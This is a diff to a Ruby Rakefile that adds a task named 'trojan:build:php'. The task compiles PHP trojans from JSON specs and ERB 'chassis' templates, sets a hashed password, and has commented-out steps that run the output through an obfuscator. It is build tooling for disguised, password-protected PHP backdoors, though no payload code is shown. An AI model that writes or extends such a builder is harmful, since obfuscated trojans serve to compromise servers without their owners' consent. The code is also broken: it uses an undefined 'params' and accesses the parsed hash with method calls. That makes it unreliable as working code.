@@ -16,6 +16,7 @@ locks = {
 # ----------------------------------------------------------------------------
 require 'digest/sha1'
 require 'erb'
+require 'json'
 include ERB::Util
 
 namespace :check do
@@ -78,6 +79,46 @@ namespace :test do
 
     namespace :suite do
 
+    end
+end
+
+
+namespace :trojan do
+    namespace :build do
+
+        desc "Compiles the PHP trojans"
+        task :php do
+            # notify the user
+            print 'Compiling PHP trojan....'
+
+            # iterate over the PHP-spec trojans
+            `ls ./trojan/spec/php`.split.each do |f|
+                # load the specs
+                trojan =  JSON::parse(File.read('./trojan/spec/php/' + f))
+
+                # calculate the password hash
+                params[:password] = Digest::SHA1.hexdigest(trojan.password + trojan.salt)
+
+                # load the trojan payloads
+                
+                # compile the trojan's erb template
+                erb = ERB.new(File.read('./trojan/template/php/chassis/' + trojan.chassis + '.php.erb' ), 0, '<>', 'buffer')
+
+                # write the erb result to a temporary file
+                #f = File.new('./trojans/plaintext/tmp.trojan.php', 'w')
+                #f.write(erb.result(binding))
+                #f.close
+
+                # process the temporary file with the PHP minifier and obfuscator
+                #`php -f ./lib/build/obfuscate.php './trojans/plaintext/tmp.trojan.php' > ./trojans/obfuscated/o.php`
+
+                # delete the temporary file
+                #File.delete('./trojans/plaintext/tmp.trojan.php')
+                
+                # complete
+                #puts 'done.'
+            end
+        end
     end
 end
 
